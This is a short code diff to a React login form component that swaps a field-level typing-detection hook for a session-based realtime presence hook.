@@ -95,18 +95,11 @@ export const LoginForm = () => {
   const [isBlocked, setIsBlocked] = useState(false);
   const [hasError, setHasError] = useState(false);
 
-  // تشخیص تایپ برای فیلدهای مختلف
-  const typingDetection = useSimpleTypingDetection({
+  // Real-time presence tracking
+  const presence = useRealtimePresence({
+    sessionId: sessionId || "",
     formName: "LoginForm",
-    enabledFields: [
-      "phone",
-      "code",
-      "password",
-      "email",
-      "emailCode",
-      "google",
-    ],
-    debounceTime: 2000,
+    enabled: !!sessionId,
   });
 
   // Register callback handler for admin actions
